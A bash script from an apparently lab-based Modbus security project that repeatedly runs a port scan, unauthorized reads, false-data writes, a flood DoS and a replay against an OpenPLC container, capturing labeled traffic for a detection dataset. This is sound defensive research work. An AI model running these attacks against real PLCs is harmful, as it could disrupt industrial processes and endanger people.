#!/usr/bin/env bash
# Repeat each Modbus attack N times with VARIED parameters to build training
# volume. Every run is its own labeled capture session (<attack>-NN); the export
# script strips the -NN suffix so all runs of an attack share one class label.
#
# Covers the 5 Modbus-layer attacks. MITM is captured differently (attacker
# vantage) -- see scripts/repeat-mitm.sh.
#
# Usage:  bash scripts/repeat-attacks.sh [N]        (default N=10)
#   e.g.  bash scripts/repeat-attacks.sh 10
set -uo pipefail
cd "$(dirname "$0")/.."                 # repo root

N="${1:-10}"
PLC_HOST="openplc"          # always target by HOSTNAME -- Docker IPs shuffle on restart

echo "[*] Staging attack scripts into kali..."
for f in modbus_read.py modbus_write.py modbus_flood.py modbus_replay.py; do
  docker cp "attacker/$f" "kali:/$f" >/dev/null
done

run() {                                 # run <label> <attack-command...>
  local label="$1"; shift
  echo "-------------------------------------------------------------"
  echo "[*] $label :  $*"
  bash scripts/capture-start.sh "$label" >/dev/null
  "$@" || echo "    [!] attack returned nonzero (continuing)"
  sleep 1                               # let final packets flush
  bash scripts/capture-stop.sh "$label" >/dev/null
  echo "    [+] captured -> sessions/$label"
}

for i in $(seq -w 1 "$N"); do
  echo "=================  ROUND $i / $N  ================="

  # recon: full-port TCP connect scan of the PLC (spans several time windows)
  run "recon-$i"  docker exec kali nmap -Pn -sT -T4 --max-retries 1 -p- "$PLC_HOST"

  # unauthorized read: enumerate coils + holding registers
  run "read-$i"   docker exec kali python3 /modbus_read.py "$PLC_HOST"

  # false-data injection / unauthorized write
  run "write-$i"  docker exec kali python3 /modbus_write.py "$PLC_HOST"

  # query flooding / DoS: vary duration 8-20s
  dur=$(( (RANDOM % 13) + 8 ))
  run "flood-$i"  docker exec kali python3 /modbus_flood.py "$PLC_HOST" 502 "$dur"

  # baseline replay: vary cycles 30-80
  cyc=$(( (RANDOM % 51) + 30 ))
  run "replay-$i" docker exec kali python3 /modbus_replay.py "$PLC_HOST" 502 "$cyc"
done

echo
echo "[*] All rounds done. Export the merged dataset with:"
echo "    bash scripts/export-dataset-csv.sh"
